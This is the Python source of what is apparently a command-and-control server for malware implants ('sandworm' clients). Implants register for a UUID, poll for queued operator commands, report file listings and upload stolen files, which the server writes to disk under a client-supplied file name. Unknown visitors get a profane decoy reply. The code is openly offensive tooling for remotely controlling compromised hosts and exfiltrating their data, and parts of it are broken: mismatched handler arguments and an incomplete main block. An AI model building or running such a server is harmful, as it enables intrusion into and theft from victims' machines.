from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import cgi
import json
import threading
import logger
import requests
import socket
import os
from urllib.parse import urlparse, parse_qs
import random
import uuid
from colorama import Fore, Style


log = logger.Logger(verbosity="debug")


TEMP_CERT_FILE = "certificates/cert.pem"
# passphrase = allo
TEMP_KEY_FILE = "certificates/key.pem"


class HTTPSession():
    def __init__(self, id, uuid, client_ip, secure=False):
        self.id = id
        self.uuid = uuid
        self.client_address = client_ip
        self.secure = secure
        self.commands_queue = []


    def get_commands_queue(self):
        return self.commands_queue
    

    def add_command(self, command, args=None):
        obj = {"command":command, "args":args}
        self.commands_queue.append(obj)


    def get_uuid(self):
        return self.uuid


class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        
        client_ip = self.client_address[0]
        client_port = self.client_address[1]
        log.debug(f"New GET request from {client_ip}:{client_port}")

        # Parsing GET parameters
        parsed_url = urlparse(self.path)
        path = parsed_url.path
        query_params = parse_qs(parsed_url.query)
        # Example with curl http://localhost/1234/allo/?test=test&admin=user
        # Parsed url : ParseResult(scheme='', netloc='', path='/1234/allo', params='', query='test=test&admin=user', fragment='') 
        # path : /1234/allo 
        # query_params : {'test': ['test'], 'admin': ['user']}
        log.debug(path)
        log.debug(str(query_params))

        # Handling client's registration
        uris = path.strip("/").split("/")
        log.debug(str(uris))
        try:
            endpoint = uris[0]
        except:
            log.error("No endpoint specified from HTTP request.")
            self.get_fucked()
            return
        
        if endpoint == "register":
            self.hanlde_register(client_ip)

        else:

            if endpoint in [str(session.get_uuid()) for session in self.server.sessions.values()]:
                action = ''
                try:
                    action = uris[1]
                
                except:
                    log.error(f"No action requested from client {endpoint}.")
                    self.get_fucked()
                    return
                
                # Let the function handle the command
                self.handle_get_command(action, endpoint, query_params)

            else:
                log.info(f"Unkown client : {client_ip}")
                self.get_fucked()
                return


    def handle_get_command(self, action, uuid, query_params):
        if action == "get_command":
            self.send_command(uuid)
        elif action == "download":
            self.handle_download(query_params)

        else:
            self.get_fucked()


    def send_command(self, client_uuid):
        commands_queue = self.server.sessions[client_uuid].get_commands_queue()
        
        if commands_queue:
            json_command = commands_queue.pop() # json object
            command = json_command.get("command")
            args = json_command.get("args")
            response = {"status":"ok", "command":command, "args":args}

        else:
            response = {"status":"empty"}

        self.send_response(200)
        self.send_header("Content-Type", "application/json") # adds a header
        self.end_headers() # adds the new line indicating the end of headers
        self.wfile.write(json.dumps(response).encode())


    def get_fucked(self):
        # Get fucked
        self.send_response(200)
        self.send_header("Content-Type", "text/plain") # adds a header
        self.end_headers() # adds the new line indicating the end of headers

        choices = [
            "They See What They've Been Told To See.", 
            "My Roads Leads Into The Desert.",
            "SILENCE!",
            "May Thy Knife Chip And Shatter."
        ]

        line = random.choice(choices)
        response = line + " Please get the fuck out."
        self.wfile.write(response.encode()) # Sends response body


    def hanlde_register(self, client_ip, secure=False):
        client_uuid = uuid.uuid4()

        self.server.add_session(str(client_uuid), client_ip, secure)

        # Tu dois renvoyer le uuid, pour que le client le connaisse
        self.send_response(200)
        self.send_header("Content-Type", "text/plain") # adds a header
        self.send_header("Auth", f"{client_uuid}") # adds a header
        self.end_headers() # adds the new line indicating the end of headers
        self.wfile.write(f"Register Successful! Welcome {client_uuid}".encode())
        return


    def do_POST(self):
        client_ip = self.client_address[0]
        client_port = self.client_address[1]
        log.debug(f"New POST request from {client_ip}:{client_port}")

        # Parsing GET parameters
        parsed_url = urlparse(self.path)
        path = parsed_url.path
        query_params = parse_qs(parsed_url.query)
        # Example with curl http://localhost/1234/allo/?test=test&admin=user
        # Parsed url : ParseResult(scheme='', netloc='', path='/1234/allo', params='', query='test=test&admin=user', fragment='') 
        # path : /1234/allo 
        # query_params : {'test': ['test'], 'admin': ['user']}

        # Handling client's registration
        uris = path.strip("/").split("/")
        log.debug(str(uris))
        

        try:
            endpoint = uris[0]
        except:
            log.error("No endpoint specified from HTTP request.")
            self.get_fucked()
            return
        
        if endpoint in [str(session.get_uuid()) for session in self.server.sessions.values()]:
                
                action = ''
                try:
                    action = uris[1]
                
                except:
                    log.error(f"No action requested from client {endpoint}.")
                    self.get_fucked()
                    return
                
                # Let the function handle the command
                self.handle_post_command(action, query_params)

        else:
            log.info(f"Unkown client : {client_ip}")
            self.get_fucked()
            return
           

    def handle_post_command(self, action, query_params):
        if action == "list":
            self.handle_list()

        elif action == "download":
            self.handle_download()

        else:
            self.get_fucked()


    def handle_list(self):
        if "Content-Length" not in self.headers:
            print("Error: Missing Content-Length header")
            self.send_response(400)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Error: Missing Content-Length header")
            return
        
        content_length = int(self.headers['Content-Length'])
        post_body = self.rfile.read(content_length).decode('utf-8')
        print("Received files list:")
        print(post_body)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"POST request to /list received")


    def handle_download(self):
        # Parsing the multipart form data
        content_type, pdict = cgi.parse_header(self.headers['Content-Type'])
        
        file_name = self.headers['File-Name']
        if content_type == 'multipart/form-data':
            pdict['boundary'] = bytes(pdict['boundary'], "utf-8")
            form_data = cgi.parse_multipart(self.rfile, pdict)
            file_data = form_data['file'][0]
            

            # writing the file data to a local file
            with open(file_name, 'wb') as file:
                file.write(file_data)

            print(Fore.GREEN + f"[+] File {file_name} received and saved locally." + Style.RESET_ALL)

            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"File received and saved locally")
            self.wfile.flush()  # Ensure all data is sent

        else:
            print("Error: Invalid content type")
            self.send_response(400)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Error: Invalid content type")


    # Overriding the log message to avoid printing to stdout
    def log_message(self, format, *args):
        pass


class HTTPServerWrapper(HTTPServer):
    def __init__(self, server_address, handler_class, on_new_http_sandworm, index, secure=False, certfile=None, keyfile=None):
        super().__init__(server_address, handler_class)
        
        self.ip = server_address[0]
        self.port = server_address[1]
        self.use_https = secure
        self.certfile = certfile
        self.keyfile = keyfile
        self.on_new_http_sandworm = on_new_http_sandworm
        self.sessions = {} # Dictionnaire avec id comme clef et valeurs HTTPSession : {<uuid4>:<HTTPSession>}
        self.running = False
        self.counter = 0
        self.index = index

        if self.use_https:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
            context.check_hostname = False
            self.socket = context.wrap_socket(self.socket, server_side=True)

        log.info(f"HTTPS server created for {self.ip}:{self.port}")


    def add_session(self, uuid, client_ip, secure):
        sandworm_index = self.counter
        self.counter += 1

        self.on_new_http_sandworm(sandworm_index, uuid, client_ip, secure, self.index)

        session = HTTPSession(sandworm_index, uuid, client_ip, secure)
        self.sessions[uuid] = session

        log.info(f"New http client (id:{sandworm_index}) with uuid {uuid} registered")
        return
    

    def add_command(self, command, uuid, args=None):
        self.sessions[uuid].add_command(command, args)


    def start(self):
        try:
            self.running = True
            self.serve_forever()
        
        except KeyboardInterrupt:
            log.warning("Server shutting down due to keyboard interrupt.")

        finally:
            self.stop()
    

    def stop(self):
        self.running = False
        self.shutdown()
        self.server_close()
        log.info("HTTP Server stopped")


if __name__ == "__main__":
    server = HTTPServerWrapper(("0.0.0.0", 8888), HTTPHandler)
    server.start()

    



